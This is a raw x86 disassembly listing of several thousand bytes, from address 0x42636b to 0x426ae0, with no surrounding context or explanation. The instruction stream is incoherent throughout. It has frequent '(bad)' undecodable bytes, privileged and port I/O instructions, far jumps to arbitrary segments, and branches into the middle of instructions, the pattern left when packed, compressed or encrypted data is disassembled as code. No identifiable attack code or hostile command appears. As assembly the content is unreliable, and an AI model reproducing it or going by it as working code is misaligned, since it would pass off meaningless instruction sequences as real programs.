  42636b:	mov    esi,0x552735d3
  426370:	and    dl,BYTE PTR [ebx+0x54]
  426373:	push   0x3f
  426375:	lds    esp,FWORD PTR [ecx+0x13cc7797]
  42637b:	xchg   esi,eax
  42637c:	push   es
  42637d:	mov    esi,0x87d155a0
  426382:	(bad)  
  426383:	jp     0x426357
  426385:	cmp    BYTE PTR [ebp-0x2d],dh
  426388:	fisub  DWORD PTR [edx+0x2a]
  42638b:	pop    edi
  42638c:	pop    ebx
  42638d:	in     eax,0xb2
  42638f:	iret   
  426390:	push   0x3e7dc0f
  426395:	mov    ebp,0x33e007d3
  42639a:	or     esp,DWORD PTR [eax-0x6df1bf57]
  4263a0:	or     bh,dh
  4263a2:	mov    cl,0x6a
  4263a4:	clc    
  4263a5:	cmp    eax,0xecf4857a
  4263aa:	std    
  4263ab:	add    ch,BYTE PTR [ebx]
  4263ad:	xor    DWORD PTR ds:0xe8b3b74b,edx
  4263b3:	pop    ss
  4263b4:	cmp    BYTE PTR [esi-0x5a11e37a],ah
  4263ba:	xor    al,0xcb
  4263bc:	mov    bh,0x24
  4263be:	push   esi
  4263bf:	lods   eax,DWORD PTR ds:[esi]
  4263c0:	sub    BYTE PTR [eax-0x75],cl
  4263c3:	test   BYTE PTR [esp+ecx*8],dh
  4263c6:	inc    esp
  4263c7:	sbb    BYTE PTR [esi+0x32],ah
  4263ca:	cdq    
  4263cb:	push   edx
  4263cc:	add    cl,bl
  4263ce:	jo     0x4263d8
  4263d0:	jg     0x4263e5
  4263d2:	xor    DWORD PTR [eax+ecx*1-0x14e203ae],esp
  4263d9:	mov    ch,BYTE PTR [eax+0x680fd40c]
  4263df:	mov    ds:0xd84443c4,al
  4263e4:	pop    eax
  4263e5:	fdivrp st(2),st
  4263e7:	mov    WORD PTR [edi+eax*1+0x36df3163],?
  4263ee:	lods   eax,DWORD PTR ds:[esi]
  4263ef:	xor    eax,0xed598824
  4263f4:	and    BYTE PTR [eax+0x491f77be],0x31
  4263fb:	pop    esi
  4263fc:	stos   BYTE PTR es:[edi],al
  4263fd:	or     bl,BYTE PTR [ecx+0x4f]
  426400:	mov    al,0x79
  426402:	inc    edi
  426403:	rcr    BYTE PTR [edx-0x58],0x62
  426407:	mov    edx,ebx
  426409:	scas   eax,DWORD PTR es:[edi]
  42640a:	cmp    eax,0x507dae90
  42640f:	ins    BYTE PTR es:[edi],dx
  426410:	shr    BYTE PTR [ebx+0x33c86694],0xa2
  426417:	pusha  
  426418:	(bad)  
  426419:	mov    ebp,0xfb15ad1b
  42641e:	repz xchg ebp,eax
  426420:	jnp    0x4263f2
  426422:	or     eax,DWORD PTR [edi]
  426424:	fcomp  QWORD PTR [ecx+0x2533d4cf]
  42642a:	mov    bl,0xbc
  42642c:	pushf  
  42642d:	cmp    BYTE PTR [eax],dl
  42642f:	mov    esp,0x3d70f1da
  426434:	sub    al,0xd5
  426436:	mov    ecx,0x9a96b500
  42643b:	push   eax
  42643c:	lock dec edx
  42643e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42643f:	inc    edi
  426440:	sbb    BYTE PTR [edx+0x18194727],dl
  426446:	xor    dl,al
  426448:	jnp    0x42647e
  42644a:	test   DWORD PTR [ebp+ebx*8-0x7f],esp
  42644e:	out    0x30,al
  426450:	fisub  DWORD PTR [edi+0x20]
  426453:	shl    ebx,0x49
  426456:	stos   BYTE PTR es:[edi],al
  426457:	shr    ch,1
  426459:	mov    ds:0xa1e63975,eax
  42645e:	adc    al,bl
  426460:	sub    al,0x99
  426462:	scas   al,BYTE PTR es:[edi]
  426463:	scas   eax,DWORD PTR es:[edi]
  426464:	add    eax,0x53f35e2e
  426469:	or     al,0x44
  42646b:	lahf   
  42646c:	sbb    BYTE PTR [ecx+0x32583fee],dl
  426472:	and    DWORD PTR [esi+0xa07cfdf],ecx
  426478:	stos   DWORD PTR es:[edi],eax
  426479:	pop    ds
  42647a:	pop    ebx
  42647b:	pop    es
  42647c:	ds mov al,0x5b
  42647f:	push   es
  426480:	xchg   ecx,eax
  426481:	stc    
  426482:	sub    BYTE PTR [edx],0x48
  426485:	stc    
  426486:	mov    dh,0x21
  426488:	(bad)  
  426489:	xchg   ch,cl
  42648b:	loope  0x4264e1
  42648d:	adc    al,0x2d
  42648f:	popf   
  426490:	dec    ebx
  426491:	and    DWORD PTR [esi-0x73],ebx
  426494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426495:	sbb    eax,0xf8212d0d
  42649a:	cli    
  42649b:	xchg   esi,eax
  42649c:	stos   DWORD PTR es:[edi],eax
  42649d:	push   0x69381a1c
  4264a2:	ror    DWORD PTR [edi+0x36],1
  4264a5:	xchg   esi,eax
  4264a6:	xchg   esi,eax
  4264a7:	(bad)  
  4264a9:	not    ebx
  4264ab:	test   eax,0xc934319c
  4264b0:	pop    esp
  4264b1:	daa    
  4264b2:	pushf  
  4264b3:	sbb    esp,DWORD PTR [edi]
  4264b5:	or     eax,0x6d91b6d3
  4264ba:	push   ds
  4264bb:	xchg   ebx,eax
  4264bc:	icebp  
  4264bd:	jl     0x4264d2
  4264bf:	int3   
  4264c0:	xor    dl,BYTE PTR [ebp+0x481a1905]
  4264c6:	jnp    0x4264d5
  4264c8:	repz ja 0x4264d1
  4264cb:	mov    ah,0xf
  4264cd:	push   esp
  4264ce:	jmp    0x4264d7
  4264d0:	cmp    dl,BYTE PTR [ecx-0x58]
  4264d3:	sub    al,0xaf
  4264d5:	adc    eax,0xaf3c31d3
  4264da:	mov    ebx,0x128479b
  4264df:	rol    BYTE PTR [edx-0x1a159016],1
  4264e5:	push   esi
  4264e6:	pop    esi
  4264e7:	push   edi
  4264e8:	(bad)  
  4264e9:	std    
  4264ea:	ins    DWORD PTR es:[edi],dx
  4264eb:	(bad)  
  4264ec:	mov    esi,0xf834930a
  4264f1:	adc    edx,ecx
  4264f3:	xlat   BYTE PTR ds:[ebx]
  4264f4:	jno    0x42647f
  4264f6:	in     al,0xf1
  4264f8:	dec    ecx
  4264f9:	dec    ecx
  4264fa:	inc    ebp
  4264fb:	fisubr WORD PTR [edx+eiz*2+0x40]
  4264ff:	loop   0x426481
  426501:	pop    edx
  426502:	xchg   esi,eax
  426503:	or     ah,0x21
  426506:	js     0x42657f
  426508:	mov    ebp,0x404c0907
  42650d:	mov    al,BYTE PTR [edx-0x2]
  426510:	arpl   WORD PTR [ebp+ebp*8+0x1a4cd98d],cx
  426517:	arpl   si,bx
  426519:	stos   DWORD PTR es:[edi],eax
  42651a:	add    BYTE PTR [eax],al
  42651c:	mov    dh,0xe4
  42651e:	xlat   BYTE PTR ds:[ebx]
  42651f:	push   esp
  426520:	xlat   BYTE PTR ds:[ebx]
  426521:	ja     0x4264da
  426523:	out    0xf3,al
  426525:	ss icebp 
  426527:	mov    esp,0xe5148025
  42652c:	sahf   
  42652d:	fld    QWORD PTR [ecx]
  42652f:	add    BYTE PTR [esi+0x57000002],al
  426535:	leave  
  426536:	les    esp,FWORD PTR [ecx+esi*2]
  426539:	dec    ecx
  42653a:	in     al,dx
  42653b:	(bad)  
  42653c:	push   ecx
  42653d:	(bad)  
  42653e:	ficom  WORD PTR [edi+0x31]
  426541:	(bad)  
  426542:	int    0xfd
  426544:	ret    0xdf7e
  426547:	inc    ecx
  426548:	mov    ds:0x2c7449ee,al
  42654d:	mov    ecx,0x12a2c3d9
  426552:	cmc    
  426553:	outs   dx,BYTE PTR ds:[esi]
  426554:	pop    eax
  426555:	sub    al,0xd8
  426557:	pushf  
  426558:	rol    BYTE PTR [ebx-0x3b],0x95
  42655c:	pop    eax
  42655d:	mov    WORD PTR [esi-0x3a],es
  426560:	in     eax,0x95
  426562:	mov    WORD PTR [ebx-0x4b],cs
  426565:	jecxz  0x4264fc
  426567:	or     BYTE PTR [eax+0x497e67a1],dl
  42656d:	js     0x42651f
  42656f:	js     0x426565
  426571:	icebp  
  426572:	test   eax,0xad36b54e
  426577:	lods   eax,DWORD PTR ds:[esi]
  426578:	sub    ch,dl
  42657a:	mov    DWORD PTR [ebx],esp
  42657c:	pop    esi
  42657d:	aas    
  42657e:	enter  0xa5fd,0x35
  426582:	push   ebp
  426583:	mov    esi,0xb867de3d
  426588:	sti    
  426589:	arpl   WORD PTR [edi+0x5c],si
  42658c:	sub    BYTE PTR [edx+eiz*4],dl
  42658f:	in     eax,0x4b
  426591:	cmc    
  426592:	loope  0x426529
  426594:	repz add ebp,eax
  426597:	cld    
  426598:	imul   esp,DWORD PTR [eax+ebx*4],0x6e
  42659c:	mov    ds:0xc4e4a0cb,eax
  4265a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265a2:	scas   al,BYTE PTR es:[edi]
  4265a3:	or     DWORD PTR [edx],0xffffff81
  4265a6:	outs   dx,BYTE PTR ds:[esi]
  4265a7:	cmp    dh,BYTE PTR [eax-0x6f56c2a0]
  4265ad:	cmp    ch,BYTE PTR [esi]
  4265af:	add    ebx,DWORD PTR [ecx]
  4265b1:	mov    ds:0xf8f53022,eax
  4265b6:	ins    BYTE PTR es:[edi],dx
  4265b7:	js     0x42655c
  4265b9:	xchg   BYTE PTR [edi-0x43b7c46f],dl
  4265bf:	push   ebp
  4265c0:	jb     0x42662e
  4265c2:	mov    ebx,0xebc2a6e8
  4265c7:	jg     0x426585
  4265c9:	cmp    DWORD PTR [edx],0x37
  4265cc:	lea    ecx,[ecx]
  4265ce:	ss jmp 0x5d88:0xb3f3e1b6
  4265d6:	sbb    DWORD PTR [esi],esp
  4265d8:	fwait
  4265d9:	lock xor eax,0x179847fe
  4265df:	xor    ebx,edx
  4265e1:	push   0xffffff81
  4265e3:	add    al,ch
  4265e5:	xchg   esp,eax
  4265e6:	push   edi
  4265e7:	xor    al,0x93
  4265e9:	mov    eax,0x7f39cb4
  4265ee:	aad    0x8d
  4265f0:	lock mov esi,0xf60a46a3
  4265f6:	push   ebx
  4265f7:	bound  eax,QWORD PTR [ebp-0x22]
  4265fa:	sbb    bl,dh
  4265fc:	xor    al,0x4a
  4265fe:	sar    ch,cl
  426600:	ja     0x42666a
  426602:	iret   
  426603:	stos   BYTE PTR es:[edi],al
  426604:	mov    ah,ch
  426606:	mov    cl,0xe8
  426608:	hlt    
  426609:	mov    edx,0x3028b0b3
  42660e:	addr16 popf 
  426610:	stc    
  426611:	jne    0x4265df
  426613:	jnp    0x42667e
  426615:	jae    0x426601
  426617:	xchg   edx,eax
  426618:	sahf   
  426619:	dec    ebp
  42661a:	xchg   esp,eax
  42661b:	loopne 0x426667
  42661d:	inc    ebp
  42661e:	xor    esi,DWORD PTR [eax]
  426620:	out    0x46,al
  426622:	and    eax,0xb33c8e90
  426627:	jbe    0x4265f5
  426629:	mov    cl,0x2f
  42662b:	pop    ss
  42662c:	xor    BYTE PTR [ebx],dh
  42662e:	ins    DWORD PTR es:[edi],dx
  42662f:	push   eax
  426630:	jo     0x426667
  426632:	(bad)  
  426633:	lea    ebp,[esi+0x26]
  426636:	jns    0x4265cf
  426638:	jg     0x42667b
  42663a:	rcr    DWORD PTR [edi+0x2760d616],1
  426640:	lea    esp,[ecx-0x58]
  426643:	xchg   ecx,eax
  426644:	in     eax,0x4f
  426646:	bound  edi,QWORD PTR [esi]
  426648:	sbb    eax,0x99c6d0d5
  42664d:	dec    ebp
  42664e:	pop    ebx
  42664f:	(bad)  [ebx-0x3abb6aa6]
  426655:	inc    ebx
  426656:	push   ds
  426657:	add    al,0x79
  426659:	xor    BYTE PTR [edx+0x58],ah
  42665c:	adc    esi,DWORD PTR [edx+eax*8+0x64]
  426660:	test   eax,0x517a28f3
  426665:	push   ebp
  426666:	aad    0x3c
  426668:	push   esp
  426669:	retf   
  42666a:	ret    0x9890
  42666d:	(bad)  
  42666e:	fs inc esp
  426670:	cmp    al,0xc1
  426672:	and    DWORD PTR [esi-0x75a61b7a],ebx
  426678:	mov    ds:0xe1bc165f,eax
  42667d:	push   ecx
  42667e:	stos   BYTE PTR es:[edi],al
  42667f:	in     al,0x71
  426681:	or     DWORD PTR [esi],edx
  426683:	xchg   ebp,eax
  426684:	xchg   edx,eax
  426685:	repz js 0x42668a
  426688:	pop    es
  426689:	cmp    DWORD PTR [edi-0x3e],esi
  42668c:	mov    ecx,gs
  42668e:	or     ebx,DWORD PTR [esi]
  426690:	mov    ebp,0xee75a458
  426695:	push   esp
  426696:	sub    al,0xfb
  426698:	or     dl,BYTE PTR [esi+0x71]
  42669b:	and    eax,0x12f09ef2
  4266a0:	push   ecx
  4266a1:	jl     0x4266c1
  4266a3:	(bad)  
  4266a4:	push   ss
  4266a5:	push   ss
  4266a6:	sub    DWORD PTR [eax+0x27],esp
  4266a9:	push   cs
  4266aa:	jmp    0xefd0:0x60067be7
  4266b1:	ret    0x46ae
  4266b4:	(bad)  
  4266b5:	(bad)  
  4266b6:	aam    0xd0
  4266b8:	jmp    0x4266b2
  4266ba:	fcom   QWORD PTR [ebp+ebx*2+0x59ab0c8a]
  4266c1:	out    dx,eax
  4266c2:	push   ds
  4266c3:	add    ebp,edi
  4266c5:	adc    al,dh
  4266c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266c8:	loop   0x426682
  4266ca:	or     DWORD PTR [esi+0x55],edx
  4266cd:	sbb    DWORD PTR [ebp+0x62],edx
  4266d0:	jnp    0x426743
  4266d2:	les    ebp,FWORD PTR [edx-0x762bbe2]
  4266d8:	pop    es
  4266d9:	push   0x43
  4266db:	leave  
  4266dc:	sbb    al,0x41
  4266de:	mov    DWORD PTR [edx+0x2da10476],0x82029166
  4266e8:	hlt    
  4266e9:	xor    al,0xcb
  4266eb:	in     eax,dx
  4266ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266ed:	addr16 repnz xchg ecx,eax
  4266f0:	sub    cl,BYTE PTR [ecx]
  4266f2:	data16 adc BYTE PTR [edx-0x6d6b2425],cl
  4266f9:	pop    ecx
  4266fa:	loop   0x4266ae
  4266fc:	daa    
  4266fd:	push   cs
  4266fe:	lahf   
  4266ff:	cmp    bl,cl
  426701:	mov    al,0x4c
  426703:	push   eax
  426704:	ja     0x426708
  426706:	std    
  426707:	push   eax
  426708:	ret    
  426709:	cmp    al,0x9
  42670b:	mov    bl,0xa2
  42670d:	in     eax,dx
  42670e:	inc    edi
  42670f:	inc    esi
  426710:	jae    0x426790
  426712:	inc    esi
  426713:	dec    esi
  426714:	dec    edx
  426715:	push   ecx
  426716:	or     DWORD PTR [ebx],0x2c2bf5c1
  42671c:	pop    ebp
  42671d:	push   ss
  42671e:	ja     0x4266c8
  426720:	(bad)  
  426722:	addr16 and edx,0x123239e4
  426729:	inc    edi
  42672a:	push   ebx
  42672b:	jnp    0x4266f7
  42672d:	push   ebx
  42672e:	inc    esi
  42672f:	sahf   
  426730:	and    DWORD PTR [edi-0x48],esi
  426733:	pop    es
  426734:	adc    ah,dl
  426736:	xchg   edi,eax
  426737:	mov    al,0x15
  426739:	in     eax,dx
  42673a:	pop    ds
  42673b:	lods   eax,DWORD PTR ds:[esi]
  42673c:	int3   
  42673d:	sbb    BYTE PTR [ebp+0x1410eab0],0xdc
  426744:	aas    
  426745:	(bad)  
  426746:	imul   esi,ebp,0x73d3b4da
  42674c:	stos   DWORD PTR es:[edi],eax
  42674d:	lods   eax,DWORD PTR ds:[esi]
  42674e:	adc    al,0x95
  426750:	mov    ebp,0x2ebd0fa3
  426755:	xor    al,0xf
  426757:	std    
  426758:	push   ecx
  426759:	xchg   edi,eax
  42675a:	imul   ecx,ecx,0x65
  42675d:	(bad)  
  42675e:	nop
  42675f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426760:	sub    al,0xea
  426762:	js     0x42673e
  426764:	pop    edi
  426765:	push   ebx
  426766:	or     al,BYTE PTR [esi+0x3e2adaf2]
  42676c:	dec    ecx
  42676d:	dec    edx
  42676e:	data16 xor BYTE PTR [edi+0x6d],ch
  426772:	inc    edi
  426773:	or     bh,BYTE PTR [edi+ecx*8-0x61f436ee]
  42677a:	sub    ebp,0xffffffdf
  42677d:	lahf   
  42677e:	sub    BYTE PTR [eax],al
  426780:	js     0x426790
  426782:	jo     0x426706
  426784:	pop    esi
  426785:	mov    ah,0x8
  426787:	xchg   edi,eax
  426788:	and    al,0x5b
  42678a:	add    BYTE PTR [ebx+0x6c],bl
  42678d:	mov    bh,BYTE PTR [eax+eax*4+0x4c4b84e1]
  426794:	mov    ebx,0x27824d6f
  426799:	fwait
  42679a:	jge    0x426799
  42679c:	dec    ecx
  42679d:	lods   al,BYTE PTR ds:[esi]
  42679e:	pop    edi
  42679f:	fstp   st(2)
  4267a1:	(bad)  
  4267a2:	gs jge 0x4267bf
  4267a5:	cmp    esi,DWORD PTR [edi+ebp*2-0x4d]
  4267a9:	mov    ecx,ebx
  4267ab:	xor    al,0x5c
  4267ad:	test   dl,bh
  4267af:	fisubr DWORD PTR [ebx-0x1732cd3c]
  4267b5:	mov    ss,WORD PTR [ebx]
  4267b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267b8:	dec    ebx
  4267b9:	clc    
  4267ba:	add    BYTE PTR [eax],al
  4267bc:	cli    
  4267bd:	rcl    DWORD PTR ds:0xfac73d07,cl
  4267c3:	push   DWORD PTR ds:0xef1c7bfe
  4267c9:	inc    esi
  4267ca:	(bad)  
  4267cb:	in     eax,dx
  4267cc:	and    al,0xe0
  4267ce:	add    DWORD PTR [eax],eax
  4267d0:	xchg   BYTE PTR [edx],al
  4267d2:	add    BYTE PTR [eax],al
  4267d4:	cmp    eax,0xefe414a7
  4267d9:	xor    BYTE PTR [eax],bl
  4267db:	sti    
  4267dc:	arpl   cx,di
  4267de:	ss in  al,dx
  4267e0:	inc    eax
  4267e1:	jg     0x42679b
  4267e3:	dec    edx
  4267e4:	retf   0xd6bf
  4267e7:	or     ch,dl
  4267e9:	ficomp DWORD PTR [ecx]
  4267eb:	and    ecx,ebx
  4267ed:	popa   
  4267ee:	adc    esi,DWORD PTR [esi+eiz*4+0x50]
  4267f2:	idiv   BYTE PTR [ebp+0x7d]
  4267f5:	or     BYTE PTR [ecx+0x7b70c335],dl
  4267fb:	(bad)  
  4267fc:	sub    al,0x56
  4267fe:	rol    ecx,1
  426800:	push   es
  426801:	pop    ebp
  426802:	fcomp  QWORD PTR [eax-0x44]
  426805:	push   edi
  426806:	popf   
  426807:	stc    
  426808:	fisub  DWORD PTR [edi]
  42680a:	xchg   edx,eax
  42680b:	mov    dl,0xe9
  42680d:	js     0x4267b7
  42680f:	out    dx,eax
  426810:	das    
  426811:	in     eax,0xe4
  426813:	shl    BYTE PTR [eax],1
  426815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426816:	outs   dx,DWORD PTR ds:[esi]
  426817:	shr    DWORD PTR [esi+eax*4-0x41896a17],0x66
  42681f:	pop    DWORD PTR [ebx+0x2f47dd14]
  426825:	rcr    bl,1
  426827:	dec    ecx
  426828:	fdiv   DWORD PTR [ecx+0x1ecb6a30]
  42682e:	push   DWORD PTR [ebx+0x37]
  426831:	dec    edx
  426832:	jp     0x4267c5
  426834:	pop    ecx
  426835:	add    dl,BYTE PTR [edi]
  426837:	inc    edx
  426838:	adc    ebx,ebx
  42683a:	xor    cl,BYTE PTR [esi-0x51]
  42683d:	mov    DWORD PTR [edx+0x58bedb24],ebp
  426843:	or     ebx,esp
  426845:	pop    edx
  426846:	mov    ds:0x3dde2d3e,al
  42684b:	fdivr  DWORD PTR [ebp-0x14]
  42684e:	inc    edi
  42684f:	rcr    DWORD PTR [edi],1
  426851:	outs   dx,BYTE PTR ds:[esi]
  426852:	xchg   edi,eax
  426853:	fldcw  WORD PTR [edi+0x2d]
  426856:	pop    esi
  426857:	lds    esi,FWORD PTR [edi+eax*1]
  42685a:	fidivr DWORD PTR [edi]
  42685c:	sbb    al,0x6c
  42685e:	jl     0x426801
  426860:	dec    ebp
  426861:	(bad)  
  426862:	icebp  
  426863:	out    0x55,eax
  426865:	paddusb mm6,QWORD PTR [edx]
  426868:	and    BYTE PTR [edi-0x44b1056a],dl
  42686e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42686f:	mov    bh,bl
  426871:	jl     0x42680c
  426873:	nop
  426874:	call   0x3419:0xba66464e
  42687b:	jge    0x426817
  42687d:	add    bh,bl
  42687f:	mov    edx,DWORD PTR [eax-0x26d0815f]
  426885:	cmp    DWORD PTR [eax],ebx
  426887:	sub    al,0x8
  426889:	cdq    
  42688a:	repz mov dh,BYTE PTR [edi]
  42688d:	sahf   
  42688e:	out    0xeb,eax
  426890:	pop    edi
  426891:	outs   dx,BYTE PTR ds:[esi]
  426892:	cmp    al,0xa2
  426894:	jmp    0xb4b5:0x95afde04
  42689b:	fcmovnbe st,st(2)
  42689d:	jo     0x426862
  42689f:	fmul   QWORD PTR [eax-0x30]
  4268a2:	repnz out 0xc9,eax
  4268a5:	shl    esi,0xde
  4268a8:	je     0x42687d
  4268aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268ab:	jnp    0x4268f5
  4268ad:	int    0xa0
  4268af:	mov    ah,0x46
  4268b1:	xchg   DWORD PTR [edx+edx*4+0x368263ff],esp
  4268b8:	cmp    al,0x64
  4268ba:	js     0x4268e6
  4268bc:	data16 cmp al,0x7c
  4268bf:	cli    
  4268c0:	ret    0xcb1e
  4268c3:	pusha  
  4268c4:	mov    ebx,0x4b272719
  4268c9:	cwde   
  4268ca:	cmp    al,0x46
  4268cc:	mov    BYTE PTR [edx],ch
  4268ce:	jo     0x426886
  4268d0:	inc    esp
  4268d1:	int3   
  4268d2:	sub    al,0x4c
  4268d4:	xor    eax,0x86fcf4bf
  4268d9:	xlat   BYTE PTR ds:[ebx]
  4268da:	sbb    eax,0xb17a40b6
  4268df:	or     dh,BYTE PTR [ebp+0x5a2ca856]
  4268e5:	xor    DWORD PTR [edx+0x77],ebx
  4268e8:	js     0x42694a
  4268ea:	mov    dh,0xb7
  4268ec:	xchg   edi,eax
  4268ed:	cmc    
  4268ee:	(bad)  
  4268ef:	and    al,0x19
  4268f1:	add    DWORD PTR [esi-0x5c741e1b],0xffffffe0
  4268f8:	lods   al,BYTE PTR ds:[esi]
  4268f9:	in     al,0x2
  4268fb:	out    0x31,al
  4268fd:	mov    eax,DWORD PTR [ecx+0xb]
  426900:	outs   dx,DWORD PTR ds:[esi]
  426901:	nop
  426902:	fsubr  QWORD PTR [eax*1+0x399e0744]
  426909:	hlt    
  42690a:	pop    ss
  42690b:	inc    ecx
  42690c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42690d:	aad    0xff
  42690f:	jnp    0x426896
  426911:	cli    
  426912:	lds    ebp,FWORD PTR [ecx+0x14d43e25]
  426918:	aad    0x3a
  42691a:	daa    
  42691b:	scas   al,BYTE PTR es:[edi]
  42691c:	and    al,BYTE PTR [edx]
  42691e:	sub    BYTE PTR ds:0x83cd934e,cl
  426924:	add    al,0x24
  426926:	daa    
  426927:	aas    
  426928:	push   edx
  426929:	repz cmp eax,eax
  42692c:	inc    eax
  42692d:	xchg   esp,eax
  42692e:	dec    ebx
  42692f:	jnp    0x4268ee
  426931:	add    al,0x8c
  426933:	ret    
  426934:	pop    es
  426935:	in     eax,0x96
  426937:	fild   QWORD PTR [ebp-0x32]
  42693a:	and    al,0x93
  42693c:	in     al,0xe2
  42693e:	iret   
  42693f:	mov    ah,0xaf
  426941:	dec    esp
  426942:	bound  eax,QWORD PTR [ebx+0x4fc66f16]
  426948:	adc    eax,0xc885418a
  42694d:	loopne 0x426921
  42694f:	xchg   esi,eax
  426950:	stos   BYTE PTR es:[edi],al
  426951:	daa    
  426952:	repz loop 0x4269cc
  426955:	push   ebp
  426956:	mov    al,ds:0x6d382a19
  42695b:	inc    edi
  42695c:	mov    ds:0x86a42f21,eax
  426961:	mov    dl,0x97
  426963:	cwde   
  426964:	xor    BYTE PTR [ebx],bh
  426966:	jmp    0xbaa:0xc840731b
  42696d:	ffreep st(7)
  42696f:	or     eax,0x96f686a6
  426974:	mov    bl,0x12
  426976:	shr    edx,cl
  426978:	xchg   ebp,eax
  426979:	inc    eax
  42697a:	out    dx,al
  42697b:	iret   
  42697c:	les    ebx,FWORD PTR [edx+0xe]
  42697f:	scas   al,BYTE PTR es:[edi]
  426980:	mov    bh,0x63
  426982:	push   ss
  426983:	pop    ebx
  426984:	jp     0x426924
  426986:	stc    
  426987:	mov    esp,es
  426989:	scas   eax,DWORD PTR es:[edi]
  42698a:	dec    edi
  42698b:	fimul  WORD PTR [ebx+ebx*8]
  42698e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42698f:	out    0xa5,eax
  426991:	test   eax,0xa2682265
  426996:	outs   dx,BYTE PTR ds:[esi]
  426997:	das    
  426998:	sbb    al,0x4
  42699a:	ret    0xd039
  42699d:	aaa    
  42699e:	ret    0x23c0
  4269a1:	pop    es
  4269a2:	mov    bh,bl
  4269a4:	shl    DWORD PTR es:[edi+0x27ec5f82],0xd0
  4269ac:	push   cs
  4269ad:	push   esi
  4269ae:	(bad)  
  4269af:	mov    ds:0x119e104f,al
  4269b4:	cmp    DWORD PTR [esi],ebx
  4269b6:	mov    edx,0x976911a8
  4269bb:	mov    ch,0xb0
  4269bd:	mov    ch,0x73
  4269bf:	mov    ebp,0xe13f67ca
  4269c4:	and    al,0x8f
  4269c6:	(bad)  
  4269c7:	xor    ah,bl
  4269c9:	cld    
  4269ca:	mov    ebx,0x2da38072
  4269cf:	(bad)  [edx]
  4269d1:	xchg   esp,eax
  4269d2:	or     BYTE PTR [ebx-0x5571ab5d],ah
  4269d8:	(bad)  
  4269d9:	stos   DWORD PTR es:[edi],eax
  4269da:	out    dx,al
  4269db:	push   ecx
  4269dc:	rcr    BYTE PTR [edx+0x34],0x6c
  4269e0:	icebp  
  4269e1:	call   0x2ebff9ac
  4269e6:	pop    es
  4269e7:	jp     0x426a46
  4269e9:	ror    BYTE PTR [ecx-0x6d21578a],1
  4269ef:	clc    
  4269f0:	sbb    DWORD PTR ds:0x1cfcca50,esp
  4269f6:	add    ebx,eax
  4269f8:	xchg   edx,eax
  4269f9:	push   0xf6ed0a50
  4269fe:	rol    BYTE PTR [esi],cl
  426a00:	call   0x6b62a1b2
  426a05:	ds mov edx,0x7bf158d5
  426a0b:	xchg   ebx,eax
  426a0c:	sub    al,0x31
  426a0e:	xchg   esi,eax
  426a0f:	mov    cl,0xef
  426a11:	sub    ebp,DWORD PTR [ecx+0x11]
  426a14:	or     DWORD PTR [ebp-0x70c12fef],eax
  426a1a:	jne    0x426a6b
  426a1c:	(bad)  
  426a1d:	aad    0xcf
  426a1f:	sub    al,bh
  426a21:	out    0xf9,al
  426a23:	xchg   esp,eax
  426a24:	xchg   ecx,eax
  426a25:	mov    esi,0xa9f1be8f
  426a2a:	loop   0x4269ce
  426a2c:	sbb    DWORD PTR [edi+0x55],ebp
  426a2f:	dec    eax
  426a30:	adc    DWORD PTR [ebp+0x5c0bddfd],esp
  426a36:	mov    ecx,DWORD PTR [edi+0x65e8cd41]
  426a3c:	mov    esp,0xbe699f32
  426a41:	dec    eax
  426a42:	mov    bh,ch
  426a44:	add    BYTE PTR [ebp+0x4c05c5a6],al
  426a4a:	in     eax,dx
  426a4b:	fst    DWORD PTR [edx+0x49c9fa50]
  426a51:	push   ss
  426a52:	cwde   
  426a53:	cmp    BYTE PTR [edx],bh
  426a55:	(bad)
  426a58:	mov    dh,0xbb
  426a5a:	add    BYTE PTR [eax],al
  426a5c:	iret   
  426a5d:	neg    BYTE PTR [ebp-0x308442b0]
  426a63:	(bad)  
  426a64:	out    dx,eax
  426a65:	lods   al,BYTE PTR ds:[esi]
  426a66:	(bad)  
  426a67:	push   ss
  426a68:	(bad)  
  426a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a6a:	lods   eax,DWORD PTR ds:[esi]
  426a6b:	jge    0x426a17
  426a6d:	loop   0x426a70
  426a6f:	add    BYTE PTR [esi+0x60000002],al
  426a75:	test   eax,0xfa0597c8
  426a7a:	lea    eax,[esi+0x13f85d81]
  426a80:	ins    BYTE PTR es:[edi],dx
  426a81:	shr    DWORD PTR [ebp+ecx*2-0x390c63ef],cl
  426a88:	push   ebp
  426a89:	xor    DWORD PTR [ecx],edi
  426a8b:	push   esp
  426a8c:	pop    esi
  426a8d:	stc    
  426a8e:	adc    eax,0x34e34c52
  426a93:	aas    
  426a94:	or     dh,BYTE PTR [ecx]
  426a96:	jb     0x426af6
  426a98:	lahf   
  426a99:	aad    0xe5
  426a9b:	mov    DWORD PTR [edi+0x37],ebx
  426a9e:	retf   
  426a9f:	in     eax,dx
  426aa0:	out    0xff,al
  426aa2:	mov    cs,ecx
  426aa4:	in     eax,dx
  426aa5:	in     al,dx
  426aa6:	outs   dx,BYTE PTR ds:[esi]
  426aa7:	cld    
  426aa8:	stc    
  426aa9:	icebp  
  426aaa:	dec    eax
  426aab:	in     al,dx
  426aac:	or     bh,BYTE PTR [eax+0x7c714194]
  426ab2:	cmp    al,dh
  426ab4:	sar    dh,1
  426ab6:	push   ds
  426ab7:	in     al,0xfd
  426ab9:	adc    bh,BYTE PTR [esi+ecx*1-0x35b14592]
  426ac0:	mov    bl,0x4c
  426ac2:	(bad)  
  426ac3:	addr16 xchg edi,eax
  426ac5:	test   eax,0x261b389a
  426aca:	fisubr WORD PTR [eax]
  426acc:	bound  esp,QWORD PTR [esp+ecx*2+0x6780522a]
  426ad3:	lock add al,0x40
  426ad6:	addr16 mov ebp,0xf8caff57
  426adc:	pop    esi
  426add:	int3   
  426ade:	xlat   BYTE PTR ds:[ebx]
  426adf:	stos   BYTE PTR es:[edi],al
  426ae0:	mov    bl,0x94
